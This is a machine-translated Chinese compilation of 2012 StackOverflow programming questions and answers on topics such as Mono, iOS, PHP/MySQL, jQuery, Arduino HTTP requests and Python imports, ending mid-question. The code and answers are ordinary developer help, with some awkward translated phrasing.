# StackOverflow 问答 13221000-13221999

# mono - 全新安装 Mono 2.10.9 后所有 exe 在 Windows XP SP3 上的崩溃

> ID：13221003
> 
> 赞同：-2
> 
> 时间：2012-11-04T17:26:34.773
> 
> 标签：mono

我是单声道菜鸟，所以请耐心等待...

我刚刚安装了 Mono 2.10.9 并打开了 Samples 文件夹——我尝试过的任何 .exe 都崩溃了。我在这里做错什么了吗...？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:24:15.373

Ok, so Mono executables can NOT be started in windows directly. You have to let the mono.exe take care of that.

So start a command line and use "Mono SomeProgram.exe" to start a mono application...

# iphone - 强制控制器的视图进入内存

> ID：13221005
> 
> 赞同：0
> 
> 时间：2012-11-04T17:26:47.593
> 
> 标签：iphone, performance, cocoa-touch, uiview, uiviewcontroller

为了解决一些性能问题，我开始回收一些视图控制器。然而，重用回收控制器视图的性能优势只有在该视图已被绘制时才会出现。例如，如果我想用控制器预先填充回收队列，但从不将其视图放在屏幕上，我就得不到这样的好处。

如何强制控制器的视图“预渲染”并添加到我的队列中，这样当它被回收时，我可以从其他回收的控制器中获得性能优势？我知道控制器的视图是在第一次需要时创建的，但即使添加视图并立即删除它（在显示父视图之前）似乎也没有这样做。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T18:34:47.403

我首先想到的一种快速而肮脏的方法是将控制器的视图设置为隐藏，并且仍然将其“绘制”到屏幕上。

也就是说，我很好奇您正在观察的“性能问题”是什么。取决于是 UIViewController 本身的创建，还是导致问题的 UIViews，那么可能会有更好的整体解决问题的方法。

# ios - Spatialite iOS5 和 xcode 4.5 - 无法准备语句：没有这样的功能：GLength

> ID：13221006
> 
> 赞同：1
> 
> 时间：2012-11-04T17:27:07.673
> 
> 标签：ios, sqlite, xcode4, spatialite

我在理智的尽头试图让 spatialite 使用适用于 iOS6（或任何其他版本）的 xcode 4.5 进行编译。实际上，我可以使用基于 [Build a static library for iOS 的技术来编译它 - 特别](https://stackoverflow.com/questions/8360673/build-a-static-library-for-ios-specifically-spatialite?lq=1)是在控制台返回一切正常但当我运行诸如

"select pk_uid from uk_highways order by GLength(geometry) limit 2" 该语句不会准备。

运行查询“从 uk_highways 限制 2 中选择 pk_uid”将返回 2 个 id，即取出空间函数 - 工作正常（是的，表中有一个几何列）

我已经敲了 3 天了，真的需要一些帮助，我不想这么说，但我想我什至需要一个“白痴指南”，如果有的话。

编辑：不知道为什么我第一次不包括这个：

```
-(int)getStreetLength
{
    int length;
    NSString *databasePath = [[NSBundle mainBundle] pathForResource:@"dhub_spatial" ofType:@"sqlite"];
    sqlite3 *db;

    if (sqlite3_open([databasePath UTF8String], &db) == SQLITE_OK)
    {
    NSLog(@"***** database opened ********");
        spatialite_init(1);
        char *sql = "SELECT pk_uid from united_kingdom_highways  where pk_uid < 100 order by GLength(Geometry) limit 2;";
        sqlite3_stmt *stmt;

        if (sqlite3_prepare(db, sql, -1, &stmt, NULL) == SQLITE_OK)
        {

            NSLog(@"***** statement prepared ********");
            while (sqlite3_step(stmt) == SQLITE_ROW)
            {
                NSLog(@"***** all the way throug to the while loop ********");

                length = sqlite3_column_int(stmt, 0);
                NSLog(@"the value of pkuid is %i",length);
            }
        }
        else
        {
            NSLog(@"could not prepare statement: %s\n", sqlite3_errmsg(db)); //this returns no such function GLength
        }
    }

    return length;
} 
```

# java - 如何使用 AutoBean 实现不同基本类型（如字符串、整数等）的列表？

> ID：13221018
> 
> 赞同：1
> 
> 时间：2012-11-04T17:28:46.423
> 
> 标签：java, gwt, json-rpc, autobean

我想用三个参数创建一个 JSON-RPC 请求——字符串、整数和我自己的对象。请求应如下所示：

```
{"method":"MyMethod", "params":["text", 123, {"name": "any text", "num": 15}], "id":1} 
```

理想情况下，我想创建一个这样的 AutoBean（但它不起作用）：

```
interface JsonRpcRequest {  

    String getJsonrpc();
    void setJsonrpc(String value);

    String getMethod();
    void setMethod(String value);

    List<Object> getParams(); // ERROR: Type Object may not be used
    void setParams(List<Object> params); // ERROR: Type Object may not be used

} 

interface JsonRpcRequestFactory extends AutoBeanFactory {

    AutoBean<JsonRpcRequest> jsonRpcRequest();

} 
```

问题是 AutoBean 框架不允许使用`List<Object>`内部接口。

是否有另一种方法来创建不同基于和非基于类型的元素列表/数组？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-04T17:50:50.583

不，你根本做不到。AutoBean 要求一切都是*静态类型的*：没有多态性，也没有混合类型的映射列表。

不过，您可能会对 RequestFactory 对 JSON-RPC 的内置支持感兴趣。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T17:50:35.360

为什么您的参数都需要在列表中传回？当然，您不会对 a `String`、 an`Integer`和 another做同样的事情`Object`！把它们都单独寄回去。

此外，您不是`Object`通过 JSON 发送自定义，而是发送`objid`该对象的...所以只需发送`Integer id`并让服务器处理它。

# python - 无法让导入在 web.py 项目中工作

> ID：13221021
> 
> 赞同：2
> 
> 时间：2012-11-04T17:29:33.763
> 
> 标签：python, module, web.py, importerror

我正在尝试使用 Web.Py 在 Python 中创建一个基本的博客应用程序。我一开始没有目录结构，但很快我需要一个。所以我创建了这个结构：

```
Blog/
├── Application/
│   ├── App.py
│   └── __init__.py
|
├── Engine/
│   ├── Connection/
│   │   ├── __init__.py
│   │   └── MySQLConnection.py
│   ├── Errors.py
│   └── __init__.py
├── __init__.py
├── Models/
│   ├── BlogPostModel.py
│   └── __init__.py
├── start.py
└── Views/
    ├── Home.py
    └── __init__.py 
```

`start.py`进口`Application.App`，其中包含 Web.Py 的东西和进口`Blog.Models.BlogPostModel`，进口`Blog.Engine.Connection.MySQLConnection`。 `Application.App`还进口`Engine.Errors`和`Views.Home`. 所有这些导入都发生在构造函数内部，所有文件中的所有代码都在类中。当我运行时`python start.py`，其中包含这三行代码：

```
from Application import App
app = App.AppInstance()
app.run() 
```

打印以下堆栈跟踪：

```
Blog $ python start.py 
Traceback (most recent call last):
  File "start.py", line 2, in <module>
    Blog = App.AppInstance()
  File "/home/goktug/code/Blog/Application/App.py", line 4, in __init__
    from Blog.Views import Home
ImportError: No module named Blog.Views 
```

但根据我从一些研究中了解到的情况，这应该运行，至少直到它在 App.py 之后达到某个目标。*谁能告诉我在哪里犯了错误？*（我可以根据要求提供更多代码，但现在我停在这里，因为这个越来越混乱）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T17:47:20.847

`Blog`如果它的父目录（不是`Blog`它本身）在 python 的路径上，您只能导入该模块。

如果你从`Blog`目录中运行你的程序，你只能`Views`直接 imort，就像你做的那样`Application.App`：

```
from Views import Home 
```

代替

```
from Blog.Views import Home 
```

在你的`Application/App.py`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T17:48:52.987

`App.py`包含语句

```
from Blog.Views import Home 
```

所以`Blog`需要在 Python 搜索模块的目录列表中 ( `sys.path`)。这可以以各种方式安排。

1.  由于您使用 启动应用程序`python start.py`，因此包含的目录`start.py`会自动添加到搜索路径中。所以你可以改变

    ```
    from Blog.Views import Home 
    ```

    到

    ```
    from Views import Home 
    ```

2.  另一种选择是`start.py`向上移动一个级别，从 `Blog`目录中移出。那么当你调用时`python start.py`，包含的目录`start.py`也将是包含的目录`Blog`。所以Python会`Blog`在执行时找到`from Blog.Views ...`

3.  最后，您可以将`Blog`目录添加到 PYTHONPATH 环境变量中。

# android - 如何设置 AsyncTask 的 get 方法抛出的 ExecutionException？

> ID：13221022
> 
> 赞同：0
> 
> 时间：2012-11-04T17:29:36.757
> 
> 标签：android, android-asynctask, executionexception

根据官方文档，[AsyncTask#get()](http://developer.android.com/reference/android/os/AsyncTask.html#get%28%29)在线程任务中发生异常时会抛出 ExecutionException。如何通知当前 AsyncTask 在[AsyncTask#doInBackground(Params...)](http://developer.android.com/reference/android/os/AsyncTask.html#doInBackground%28Params...%29)方法中引发了异常？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T17:43:20.490

最好不要使用`AsyncTask.get()`，因为`get()`是同步的，所以你什么也得不到

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T18:45:00.543

你不能。

`Future#get()`ExecutionException 由内部调用的方法引发`AsyncTask#get()`。

[期货](http://developer.android.com/reference/java/util/concurrent/Future.html)确实允许在其执行的异步块中抛出异常。调用`Future#get()`将抛出封装在 ExecutionException 中的此类异常。

然而，AsyncTasks 不允许在`AsyncTask#doInBackground()`方法中抛出异常。因此，您不能将此机制用于异常处理。这似乎是一个架构设计决策。

免责声明：

您可能仍然可以在您的 中抛出 RuntimeExceptions `AsyncTask#doInBackground()`，导致相关`ExecutionException`的`AsyncTask#get()`... 但您不应该;)

笔记：

您确定要调用`AsyncTask#get()`并阻止调用线程吗？从你的 main/ui 线程调用它会导致你的用户界面停止刷新，直到你的任务完成。

# php - 如何从txt文件导入mysql空值

> ID：13221031
> 
> 赞同：0
> 
> 时间：2012-11-04T17:30:48.650
> 
> 标签：php, mysql, null

我在 php 中编写了一个代码，其中我：

1.  打开一个txt文件，
2.  阅读每一行，
3.  使用该`explode()`功能将线条分成几部分（基于空格）
4.  将每个子字符串分配给变量和
5.  在数据库中插入所有内容。

在这些线上，我有数字，有时还有`NULL`值。问题是，当我将所有内容插入 mysql 时，空值显示为`0`而不是`null`.

是否可以将 txt 中的空值显示为 db 中我的表中的空值？

如果我没有解释清楚，请告诉我。

谢谢你。
d。

```
<!DOCTYPE HTML>
<?php

// This code:
// 1) opens a txt file, which is stored in a specified folder,
// 2) reads each line of the file,
// 3) inserts the data in the specified database

// Connect to the database
include('connect.php'); 
// Define the location of the txt file.
$myFile = "/Applications/MAMP/htdocs/php_test/data_correct.txt";
// Open the file
$fh = fopen($myFile,'r') or die ("Could not open:".mysql_error());
// !feof means "not the end of the file"
while (!feof($fh)){
// fgets: gets the first line of $fh and assigns it to the variable $line
// Each line can be up to 5000 characters long
$line = fgets($fh,5000);
 // explode function separated the string by means of "tab" space
  list($WN,$TOW,$Receiver_ID,$lat,$lon,$height,$SVID,$Azimuth,$Elevation,$Total_S4_L1,$SNR_L1,$Phi01_L1,$Phi03_L1,$Phi10_L1,$Phi30_L1,$Phi60_L1,$TEC_TOW_45,$dTEC_TOW_60_45,$TEC_TOW_30,$dTEC_TOW_45_30,$TEC_TOW_15,$dTEC_TOW_30_15,$TEC_TOW,$dTEC_TOW_15_TOW,$L1_lock_time,$L2_lock_time,$SI_index_L1,$Total_S4_L2,$SNR_L2,$Phi01_L2,$Phi03_L2,$Phi10_L2,$Phi30_L2,$Phi60_L2,$Lock_L2,$SI_index_L2,$Total_S4_L5,$SNR_L5,$Phi01_L5,$Phi03_L5,$Phi10_L5,$Phi30_L5,$Phi60_L5,$Lock_L5,$SI_index_L5)=explode(" ",$line);

  // insert data into table in database. The name of the table is GPS.
 // The primary key increases automatically. The null values are acceptable.

    $query = ("INSERT INTO GPS      (WN,TOW,Receiver_ID,lat,lon,height,SVID,Azimuth,Elevation,Total_S4_L1,SNR_L1,Phi01_L1,Phi03_L1,Phi10_L1,Phi30_L1,Phi60_L1,TEC_TOW_45,dTEC_TOW_60_45,TEC_TOW_30,dTEC_TOW_45_30,TEC_TOW_15,dTEC_TOW_30_15,TEC_TOW,dTEC_TOW_15_TOW,L1_lock_time,L2_lock_time,SI_index_L1,Total_S4_L2,SNR_L2,Phi01_L2,Phi03_L2,Phi10_L2,Phi30_L2,Phi60_L2,Lock_L2,SI_index_L2,Total_S4_L5,SNR_L5,Phi01_L5,Phi03_L5,Phi10_L5,Phi30_L5,Phi60_L5,Lock_L5,SI_index_L5)  
     VALUES   ('".$WN."','".$TOW."','".$Receiver_ID."','".$lat."','".$lon."','".$height."','".$SVID."','".$Azimuth."','".$Elevation."','".$Total_S4_L1."','".$SNR_L1."','".$Phi01_L1."','".$Phi03_L1."','".$Phi10_L1."','".$Phi30_L1."','".$Phi60_L1."','".$TEC_TOW_45."','".$dTEC_TOW_60_45."','".$TEC_TOW_30."','".$dTEC_TOW_45_30."','".$TEC_TOW_15."','".$dTEC_TOW_30_15."','".$TEC_TOW."','".$dTEC_TOW_15_TOW."','".$L1_lock_time."','".$L2_lock_time."','".$SI_index_L1."','".$Total_S4_L2."','".$SNR_L2."','".$Phi01_L2."','".$Phi03_L2."','".$Phi10_L2."','".$Phi30_L2."','".$Phi60_L2."','".$Lock_L2."','".$SI_index_L2."','".$Total_S4_L5."','".$SNR_L5."','".$Phi01_L5."','".$Phi03_L5."','".$Phi10_L5."','".$Phi30_L5."','".$Phi60_L5."','".$Lock_L5."','".$SI_index_L5."')");

    $result = mysqli_query($dbcon, $query) or die('no available data');

   }// end of while loop
  fclose($fh); 

   ?> 
```

创建表查询是：

```
CREATE TABLE `GPS` ( 
  `id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
  `WN` INT,  # GPS Week Number
  `TOW` INT, # Time of Week (seconds)
  `Receiver_ID` VARCHAR( 30), # Name of GPS receiver
  `lat` FLOAT(10,6), # Latitude of the GPS receiver
  `lon` FLOAT(10,6), # Longitude of the GPS receiver
   `height` FLOAT(10,2), # Height
   `SVID` INT, #Satellite ID
   `Azimuth` INT, # Azimuth in degrees
   `Elevation` INT, #Elevation in degrees
   `Total_S4_L1` FLOAT(10,3), # Total S4 on L1 (dimensionless)
   `SNR_L1` FLOAT(10,1), # SNR on L1 (db)
   `Phi01_L1` FLOAT(10,3), # Phi01 on L1, 1-second phase sigma (radians)
   `Phi03_L1` FLOAT(10,3), # Phi03 on L1, 3-second phase sigma (radians)
   `Phi10_L1` FLOAT(10,3), # Phi10 on L1, 10-second phase sigma (radians)
   `Phi30_L1` FLOAT(10,3), # Phi30 on L1, 30-second phase sigma (radians)
   `Phi60_L1` FLOAT(10,3), # Phi60 on L1, 60-second phase sigma (radians)
   `TEC_TOW_45` FLOAT(10,4), # TEC at TOW -45s (TECU --> TEC SLUNT)
   `dTEC_TOW_60_45` FLOAT(10,4), # dTEC from TOW -60s to TOW -45s (TECU)
   `TEC_TOW_30` FLOAT(10,4), # TEC at TOW -30s (TECU --> TEC SLUNT)
  `dTEC_TOW_45_30` FLOAT(10,4), # dTEC from TOW -45s to TOW -30s (TECU)
   `TEC_TOW_15` FLOAT(10,4), # TEC at TOW -15s (TECU --> TEC SLUNT)
  `dTEC_TOW_30_15` FLOAT(10,4), # dTEC from TOW -30s to TOW -15s (TECU)
 `TEC_TOW` FLOAT(10,4), # TEC at TOW (TECU --> TEC SLUNT)
  `dTEC_TOW_15_TOW` FLOAT(10,4), # dTEC from TOW -15s to TOW (TECU)
  `L1_lock_time`  INT, # L1 lock time (seconds)
  `L2_lock_time` INT, #L2 lock time (seconds)
  `SI_index_L1` FLOAT (10,4), # SI Index on L1: (10*log10(Pmax)-  10*log10(Pmin))/(10*log10(Pmax)+10*log10(Pmin)) (dimensionless)
  `Total_S4_L2` FLOAT(10,3), # Total S4 on L2 (GPS/GLO) or E5a (GAL) (dimensionless)
   `SNR_L2` FLOAT(10,1), # SNR on L2 (dB)
  `Phi01_L2` FLOAT(10,3), # Phi01 on L2 (GPS/GLO) or E5a (GAL),  1-second phase sigma (radians)
   `Phi03_L2` FLOAT(10,3), # Phi03 on L2 (GPS/GLO) or E5a (GAL),  3-second phase sigma (radians)
   `Phi10_L2` FLOAT(10,3), # Phi10 on L2 (GPS/GLO) or E5a (GAL), 10-second phase sigma (radians)
   `Phi30_L2` FLOAT(10,3), # Phi30 on L2 (GPS/GLO) or E5a (GAL), 30-second phase sigma (radians)
   `Phi60_L2` FLOAT(10,3), # Phi60 on L2 (GPS/GLO) or E5a (GAL), 60-second phase sigma (radians)
  `Lock_L2`  INT, # Lock time of L2 (GPS/GLO) or E5a (GAL) (seconds)
  `SI_index_L2` FLOAT (10,4), # SI Index on L2 (GPS/GLO) or E5a (GAL) (dimensionless)
  `Total_S4_L5` FLOAT(10,3), # Total S4 on L5 (GPS/GLO) or E5a (GAL) (dimensionless)
 `SNR_L5` FLOAT(10,1), # SNR on L5 (dB)
 `Phi01_L5` FLOAT(10,3), # Phi01 on L5 (GPS/GLO) or E5a (GAL),  1-second phase sigma (radians)
  `Phi03_L5` FLOAT(10,3), # Phi03 on L5 (GPS/GLO) or E5a (GAL),  3-second phase sigma (radians)
   `Phi10_L5` FLOAT(10,3), # Phi10 on L5 (GPS/GLO) or E5a (GAL),  10-second phase sigma (radians)
  `Phi30_L5` FLOAT(10,3), # Phi30 on L5 (GPS/GLO) or E5a (GAL),  30-second phase sigma (radians)
  `Phi60_L5` FLOAT(10,3), # Phi60 on L5 (GPS/GLO) or E5a (GAL),  60-second phase sigma (radians)
  `Lock_L5`  INT, # Lock time of L5 (GPS/GLO) or E5a (GAL) (seconds)
  `SI_index_L5` FLOAT (10,4) # SI Index on L5 (GPS/GLO) or E5a (GAL) (dimensionless)
 ) # Default storage engine from version MySQL 5.5 is InnoDB 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T17:37:35.113

要将 NULL 传递给 MySQL，您只需这样做。

```
INSERT INTO table (field,field2) VALUES (NULL,'value') 
```

在代码中，检查 $var, $var2 是否为 null，如果是，则使用 NULL 而不是 '$var' 或 '$var2'。

```
$var = !empty($var) ? "'$var'" : "NULL";
$var2 = !empty($var2) ? "'$var2'" : "NULL";

$query = "INSERT INTO data (field1, field2)
      VALUES ('$var', '$var2',)"; 
```

# php - PHP 和 Tumblr API - 自动发布

> ID：13221032
> 
> 赞同：2
> 
> 时间：2012-11-04T17:30:55.193
> 
> 标签：php, api, tumblr

我正在使用 Tumblr API 并尝试构建自动海报。我有一个运行的脚本，然后我作为用户要求允许我的 Tumblr 应用程序，然后我通过了身份验证 => 发布了一个帖子。

我试图通过 CRON 运行这个脚本，但它不起作用。为什么？我为什么 - 当我运行脚本时，我总是被要求确认我允许我的 Tumblr 应用程序访问我的博客......

你怎么看？可能是这个问题吗？另外，有什么办法可以解决吗？

先感谢您

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-05T03:23:10.683

如果任何脚本需要用户交互，它在通过 cron 运行时将不起作用。Cron 不知道如何为你回答。Tumblr 使用 oauth 进行身份验证，它可能会让你在每次尝试发布时都经历 oauth 流程。如果您拥有正确的请求令牌和请求令牌机密，则无需手动授权您的应用程序即可发布帖子。阅读 Tumblr 的 api 文档、oauth 流程，并寻找一个与 Tumblr 的 api 配合使用的库。

# jquery - jQuery Ajax 加载器/微调器

> ID：13221033
> 
> 赞同：0
> 
> 时间：2012-11-04T17:31:12.567
> 
> 标签：jquery, ajax, comments, toggle

目前我有以下 jQuery/Ajax 以便在用户单击 div 时加载评论：

```
 function showComments(post_id) {
                    $("#comment-"+post_id).toggle();
                    $.ajax({ 
                         dataType: 'html',
                         cache: false,
                         url: 'ajax.php',
                         type: 'POST',
                         data: {comments: post_id}
                    }).done(function(html) { 
                        $('#comment-'+post_id).html(html)
                    });
                } 
```

这一切都很好，因为默认的 div 中有微调器，它会在内容加载之前显示。但是，如果用户再次单击它以隐藏它，然后单击以再次显示微调器不会出现，因为内容没有明显重置。所以我尝试使用 .toggles 鼠标事件处理程序：

```
 function showComments(post_id) {
                    $("#comment-"+post_id).toggle(function() {
                        $('#comment-'+post_id).show();
                        $.ajax({ 
                            dataType: 'html',
                            cache: false,
                            url: 'ajax.php',
                            type: 'POST',
                            data: {comments: post_id}
                        }).done(function(html) { 
                            $('#comment-'+post_id).html(html)
                        });   
                    }, function() {
                        $('#comment-'+post_id).hide();
                        $('#comment-'+post_id).html('<img src="/loader.gif" />')
                    });
                } 
```

但是，这一次，没有任何效果，div 没有显示或隐藏，也没有调用 Ajax。任何想法我可能做错了什么？

编辑：

这是 HTML/PHP：

```
 <div class="comments right" title="Click to view comments" onclick="showComments('.$post['id'].')">'.$post['comments_cache'].'</div>
                            <div style="display:none" id="comment-'.$post['id'].'" class="top-15"><img src="/loader.gif" /></div> 
```

以上没有任何问题，它适用于我向您展示的第一个功能。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:30:08.630

通过执行以下操作修复它：

```
 function showComments(post_id) {
                if ($('#comment-'+post_id).html().length > 0) {
                    $('#comment-'+post_id).empty().hide();
                } else {
                    $('#comment-'+post_id).html('<img src="loader.gif" />').show();
                    $.ajax({ 
                         dataType: 'html',
                         cache: false,
                         url: 'ajax.php',
                         type: 'POST',
                         data: {comments: post_id}
                    }).done(function(html) { 
                        $('#comment-'+post_id).html(html)
                    }); 
                }
            } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T18:30:28.630

您可以使用`beforeSend`jQuery 的属性，并`'open'`在 div 打开后向其添加一个类以跟踪显示。

```
function showComments(post_id) {
  $("#comment-" + post_id).click(function () {
    if (!$(this).hasClass('open')) {
      $.ajax({
        dataType: 'html',
        cache: false,
        beforeSend: function () {
          $(this).show().addClass('open');
        },
        url: 'ajax.php',
        type: 'POST',
        data: {
          comments: post_id
        },
        success: function (html) {
          $(this).html(html);
        }
      });
    } else {
      $(this).hide().html('<img src="/loader.gif" />').removeClass('open');
    }
  });
} 
```

# apache - Arduino Ethernet Shield:: HTTP/1.1 400 错误请求

> ID：13221036
> 
> 赞同：0
> 
> 时间：2012-11-04T17:31:19.843
> 
> 标签：apache, webserver, arduino, http-status-codes, bad-request

我有以下 Arduino 代码。它连接到服务器并将传感器的读数发送给它。来自服务器的回复总是：

> HTTP/1.1 400 错误请求

Arduino代码如下。

```
#include <Ethernet.h>           //Library for Ethernet functions
#include <Client.h>             //Library for client functions
#include <OneWire.h>            //Library for the onewire bus
#include <SPI.h>

// Ethernet settings
uint8_t hwaddr[6]   = {0xDE, 0xAD, 0xBE, 0xEF, 0xBA, 0xBE}; // MAC address of Arduino
uint8_t ipaddr[4]   = {192, 168,   0, 55};                  // IP address of Arduino
uint8_t gwaddr[4]   = {192, 168,   0,  1};                  // IP address of gateway ( for later DNS implementation)
uint8_t subnet[4]   = {255, 255, 255,  0};                  // Subnet mask           ( for later DNS implementation)
uint8_t serverip[4] = {192, 168,   0, 54};                  // IP address of server arduino sends data to

uint8_t serverport = 80;                                    // The port the Arduino talks to

EthernetClient client;           // Make a new instance from type "Client" named "client", giving it
int numSensors;                  // a variable to store the number of sensors.

bool connected = false;          // Yes-no variable (boolean) to store if the arduino is connected to the server.
int i = 0;                       // Variable to count the sendings to the server.

void setup() {
    Serial.begin(9600);                                       // Start the serial port
    Serial.println("Initializing Ethernet.");
    Ethernet. begin(hwaddr, ipaddr);                          // Start up Ethernet
}

void loop() {
    if(!connected)   {                                        // If "not" connected print: not connected ;)
        Serial.println("Not connected");
        Serial.println("Connecting to server...");
        if (client.connect(serverip, serverport)) {           // If connected, set variable connected to "true" and
            connected = true;
            Serial.println("connected!!");
            String data;
            data+="";
            data+="t0=";
            data+=analogRead(A0);
            //    data+="&&";
            //    data+="t1=";
            //    data+=analogRead(A1);
            //    data+="&&";
            //    data+="t2=";
            //    data+=analogRead(A2);
            Serial.println("Sending to Server: ");
            Serial.println();
            client.print("GET /formSubmit.php?" + data);
            Serial.print("GET /formSubmit.php?" + data);
            client.println(" HTTP/1.1");
            Serial.println(" HTTP/1.1");
            client.println("Host: http://localhost/PhpProject1");
            Serial.println("Host: http://localhost/PhpProject1");
            client.println("User-Agent: Arduino");
            Serial.println("User-Agent: Arduino");
            client.print("Content-Length: ");
            Serial.print("Content-Length: ");
            client.println(data.length());
            Serial.println(data.length());
            client.println("Accept: text/html");
            Serial.println("Accept: text/html");
            client.println("Connection: close");
            Serial.println("Connection: close");

            client.println();
            Serial.println();

            if (client.available()) {
                char c = client.read();
                Serial.print(c);
            }
            delay(10000);
        }
        else {
            Serial.println("Cannot connect to Server");       //  else block if the server connection fails (debugging)
        }                                                     
    }                                                         
    else {                                                    
        delay(500);                                           //
        while (client.connected() && client.available()) {    // When connected and availabe:
            char c = client.read();                           // read the answer of the server and
            Serial.print(c);                                  // print it to serial port
        }
        //
        Serial.println();                                     //
        client.stop();                                        // Stop the connection and set
        connected = false;                                    // "connected" to false
    }
} 
```

上传此代码后串行监视器上的输出为：

```
Initializing Ethernet.
Not connected

Connecting to server...
connected!!

Sending to Server:

GET /formSubmit.php?t0=433 HTTP/1.0
Host: http://localhost/PhpProject1
User-Agent: Arduino
Content-Length: 6
Accept: text/html
Connection: close

HTTP/1.1 400 Bad Request
Date: Sat, 03 Nov 2012 17:06:00 GMT
Server: Apache/2.4.3 (Win32) OpenSSL/1.0.1c PHP/5.4.7
Content-Length: 343
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.3 (Win32) OpenSSL/1.0.1c PHP/5.4.7 Server at http://localhost/PhpProject1 Port 80</address>
</body></html> 
```

可能是什么问题？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-04T18:19:12.940

你**的**要求不好。

1.  `Host`字段不得包含`/`，请尝试：`Host: localhost`
2.  `Content-Length`在`GET`方法上毫无意义
3.  也许您需要终止每一行`\r\n`而不是仅仅`\n`（取决于服务器）

# javascript - 使用 javascript/jquery 将输入字符限制为 android chrome 上的数字时出现问题

> ID：13221038
> 
> 赞同：4
> 
> 时间：2012-11-04T17:31:25.053
> 
> 标签：javascript, android, jquery, google-chrome

我正在尝试将文本输入的输入限制为仅数字。我为 jquery keydown() 设置了一个事件处理程序，如下所示。它可以在我测试过的桌面浏览器以及 iOS 上的移动 safari 和 chrome 上按预期工作。但我在 Nexus 7 上的 chrome 中遇到了一些问题。

```
function keyDownHandler( e ) {

    e.stopImmediatePropagation();

    if( !e.shiftKey && !e.altKey && !e.ctrlKey ) {

        var key = e.which || e.keyCode;

        if( key >= 48 && key <= 57 || 
            key >= 96 && key <= 105 || 
            key == 8 || key == 9 ||
            key == 37 || key == 39 ||
            key == 46 || key == 45 ) {

            return true;
        }

        if( key == 13 ) {
            //returned pressed, do something
        }
    }

    e.preventDefault();

    return false;
}; 
```

与 android 软键盘相关的已知错误似乎很少，因此每个键都返回相同的 keycode 值。该值也因设备而异，但对于 nexus 7，它是 229。数字键也间歇性地返回正确的键码值，这很好。我应该能够添加一些捕获所有逻辑来处理这个问题，但我坚持的问题是，即使这个方法返回 false 并调用 e.preventDefault()，它也不会阻止字符出现在文本中输入？

我做错了什么，需要调用其他东西来取消 android chrome 上的事件还是这是一个错误？

需要注意的是，它在 Nexus 7 上的 firefox 和 dolphin 中运行良好，而不是在 chrome 或 opera 中出现同样的问题。

谢谢。

# spring - 如何使用 Tomcat 6 和 Spring 3.0.4 访问 css 文件

> ID：13221039
> 
> 赞同：0
> 
> 时间：2012-11-04T17:31:25.697
> 
> 标签：spring, tomcat

我尝试通过以下方式访问css文件：

```
<link rel="stylesheet" href="META-INF/resources/css/style.css" /> 
```

结构：

```
springhibernate
 -META-INF
   -recources
       -css
           -style.css
       -img
 -WEB-INF
    -classes
    -jsp
    web.xml
    application-context.xml 
```

web.xml 部分：

```
 <servlet>
        <servlet-name>test</servlet-name>
        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
        <load-on-startup>1</load-on-startup>
    </servlet>

    <servlet-mapping>
        <servlet-name>test</servlet-name>
        <url-pattern>/</url-pattern>
    </servlet-mapping> 
```

如何引用 css 文件？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T21:54:36.550

根据规范，不能使用 URL 访问 META-INF 目录。它的目的是保存对 Java 归档工具、xml 描述符等有用的信息。

在您的 .war 文件中创建单独的顶级目录以提供 CSS、Javascript、HTML 等文件。

注意：您可以使用[ServletContext](http://docs.oracle.com/javaee/6/api/javax/servlet/ServletContext.html)的 getResource 和 getResourceAsStream 调用访问 Java 代码中 META-INF 中的所有内容。限制是它不能被 URL 引用。

# jquery - jQuery点击事件

> ID：13221041
> 
> 赞同：0
> 
> 时间：2012-11-04T17:31:27.900
> 
> 标签：jquery

我想做以下事情：在标签内有一个标签。监听标签的 click() 事件。在点击事件中，我想检查 img 标签是否具有特定属性。

例如：

```
<a href='#' id='myid'><img src='' alt='' played='1'></a>

$('#myid').click(function(e){
  if(e.target.attr('played')){
    // do something...
  }
}); 
```

如何获取我的 img 标签的属性？我从不检查 jquery 中的元素处理程序...

亲切的问候！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T17:34:51.040

```
$('#myid').click(function(e){
  if( $(this).find('img').attr('played') == 1)
  {
    // do something...
  }
}); 
```

ps

最好使用 'data-played' 作为属性名称

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T17:35:50.360

你可以这样做：

```
$('#myid').click(function(e){
  e.preventDefault(); // stopping default behaviour of the anchor
  var played_attribute = $(this).find(img).attr('played');
  if(played_attribute == '1') {
   //attribute had value of 1
  } else {
   //attribute either never existed or didnt have value of 1
  }
}); 
```

希望能帮助到你。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T17:37:21.780

你应该做`$(e.target).attr("played")`

# python - 更改全局范围对象

> ID：13221042
> 
> 赞同：1
> 
> 时间：2012-11-04T17:31:36.350
> 
> 标签：python, python-3.x, global-variables

我对python中的全局范围有疑问。

我制作了这个脚本并且可以工作，但我不知道为什么：

```
#! /bin/python3
# -*- coding: UTF-8 -*-

data = []
stats = {'white':0, }

def main():
    global data

    with open(args.finput, 'r') as f:
        data = f.readlines()

    rwhitespaces()

    with open(foutput, 'w') as f:
        for line in data:
            f.write(line)

    print(stats)

def rwhitespaces():
    cnt = 0
    for line in data:
        if line == '\n':
            data.pop(cnt) # Modifing data var without global keywork and works, why??
